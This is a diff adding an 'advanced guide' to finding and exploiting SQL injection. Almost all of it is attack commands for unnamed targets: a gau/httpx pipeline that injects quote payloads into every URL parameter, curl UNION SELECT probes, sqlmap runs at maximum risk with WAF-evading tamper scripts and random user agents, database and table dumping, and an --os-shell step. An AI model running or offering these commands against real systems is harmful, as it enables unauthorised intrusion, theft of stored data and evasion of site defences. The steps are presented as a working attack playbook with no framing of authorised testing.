@@ -1,0 +1,99 @@
+Advanced Guide to Detecting and Exploiting SQL Injection
+
+Introduction:
+
+In this guide, we’ll delve into a more advanced method for detecting SQL Injection vulnerabilities and efficiently exploiting them using SQLMap. This approach will help identify vulnerable endpoints more accurately and allow for precise exploitation, targeting various databases.
+
+⸻
+
+Step 1: Automating SQL Injection Discovery
+
+To streamline the process of identifying SQL Injection points, we’ll use a powerful combination of tools and commands:
+
+Command:
+
+echo "http://<target>/" | gau | uro | grep "\?" | sed "s/=.*/=A'/" | uniq > params.txt; 
+cat params.txt | httpx -mc 200 -mr ".*SQL.*|.*syntax.*|.*error.*" -silent
+
+Explanation:
+1.gau (Get All URLs): Retrieves a comprehensive list of endpoints for the target.
+2.uro: Removes duplicate URLs to reduce redundancy.
+3.grep “?”: Filters only endpoints with parameters.
+4.sed: Replaces parameter values with a typical SQL Injection payload (=A').
+5.uniq: Ensures unique endpoints are recorded.
+6.httpx: Probes each endpoint for SQL error messages, displaying only successful hits (-mc 200).
+7.-mr: Matches responses containing SQL error patterns.
+8.-silent: Reduces clutter for a cleaner output.
+
+Pro Tip:
+Add more patterns to the regex search for better detection:
+
+-mr ".*SQL.*|.*syntax.*|.*error.*|.*database.*|.*ODBC.*|.*mysqli.*|.*MySQL.*|.*pgSQL.*"
+
+⸻
+
+Step 2: Analyzing the Results
+
+Upon executing the command, you’ll obtain a list of potential vulnerable endpoints. To further verify these, perform a manual inspection using simple payloads:
+
+Manual Payloads:
+
+curl -s "http://<target>/vuln?param=1'" | grep -i "SQL syntax"
+curl -s "http://<target>/vuln?param=-1 UNION SELECT 1,2,3" | grep -i "SQL syntax"
+
+If the response contains SQL syntax errors or related messages, proceed to exploitation.
+
+⸻
+
+Step 3: Advanced Exploitation with SQLMap
+
+Once a potential vulnerability is identified, leverage SQLMap for exploitation. Fine-tune your attack by specifying the database type and increasing risk and level for deeper analysis.
+
+Command:
+
+sqlmap -u "http://<target>/vuln?param=A" -p param --dbms=MSSQL --level 5 --risk 3 --banner --batch --random-agent --tamper=space2comment
+
+Explanation:
+•-p param: Specifies the vulnerable parameter.
+•–dbms: Indicates the database management system (e.g., MSSQL, MySQL, PostgreSQL).
+•–level 5 –risk 3: Sets the level and risk to the highest for more comprehensive testing.
+•–banner: Retrieves the database banner for identification.
+•–batch: Automates the process by skipping interactive prompts.
+•–random-agent: Uses a random user agent to evade detection.
+•–tamper=space2comment: Obfuscates payloads to bypass WAF or filters.
+
+⸻
+
+Step 4: Extracting Data from the Database
+
+After confirming the vulnerability, proceed with data extraction. To enumerate databases and dump tables, use the following commands:
+
+Enumerate Databases:
+
+sqlmap -u "http://<target>/vuln?param=A" -p param --dbs
+
+Dump Tables from a Specific Database:
+
+sqlmap -u "http://<target>/vuln?param=A" -p param -D database_name --tables
+
+Dump Data from a Table:
+
+sqlmap -u "http://<target>/vuln?param=A" -p param -D database_name -T table_name --dump
+
+⸻
+
+Advanced Techniques:
+1.WAF Bypass:
+Utilize multiple tamper scripts to obfuscate your payload:
+
+--tamper=space2comment,between,percentage
+
+2.Proxy for Monitoring:
+Integrate Burp Suite for traffic inspection:
+
+--proxy=http://127.0.0.1:8080
+
+3.OS Shell Access:
+In case of command execution capabilities:
+
+sqlmap -u "http://<target>/vuln?param=A" -p param --os-shell
